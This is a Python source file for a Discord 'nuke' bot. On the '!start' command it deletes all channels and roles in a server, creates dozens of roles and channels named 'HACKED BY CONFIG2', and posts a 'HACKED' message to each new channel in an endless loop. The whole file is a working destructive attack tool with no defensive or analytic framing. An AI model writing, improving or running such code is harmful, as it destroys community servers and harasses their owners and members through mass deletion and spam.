import discord
from discord.ext import commands
import asyncio
import os
import random

TOKEN = os.environ.get("DISCORD_TOKEN")
SPAM_MESSAGE = "# **HACKED MY CONFIG2 LOL EZZZ** https://discord.gg"
TARGET_NAME = "HACKED BY CONFIG2"

intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents)

active_nukes = {}

async def spam_task(channel):
    """Infinite spam loop for a channel."""
    while active_nukes.get(channel.guild.id):
        try:
            await channel.send(SPAM_MESSAGE)
        except:
            break

@client.command()
async def start(ctx):
    """Triggers the nuke immediately."""
    guild = ctx.guild
    active_nukes[guild.id] = True
    
    # 1. Delete everything (Channels & Roles)
    delete_tasks = [target.delete() for target in guild.channels + guild.roles if target.name != "@everyone"]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # 2. Create Roles (30-50)
    role_tasks = [guild.create_role(name=TARGET_NAME, color=discord.Color.red()) for _ in range(random.randint(30, 50))]
    await asyncio.gather(*role_tasks, return_exceptions=True)

    # 3. Create Channels & Start Spamming
    for _ in range(random.randint(30, 50)):
        try:
            new_channel = await guild.create_text_channel(TARGET_NAME)
            client.loop.create_task(spam_task(new_channel))
        except:
            break

@client.command()
async def stop(ctx):
    """Stops the spam loops for this server."""
    active_nukes[ctx.guild.id] = False
    await ctx.send("Nuke stopped.")

@client.event
async def on_guild_channel_create(channel):
    """Ensures any newly created channel starts spamming if nuke is active."""
    if active_nukes.get(channel.guild.id) and channel.name == TARGET_NAME:
        client.loop.create_task(spam_task(channel))

client.run(TOKEN)
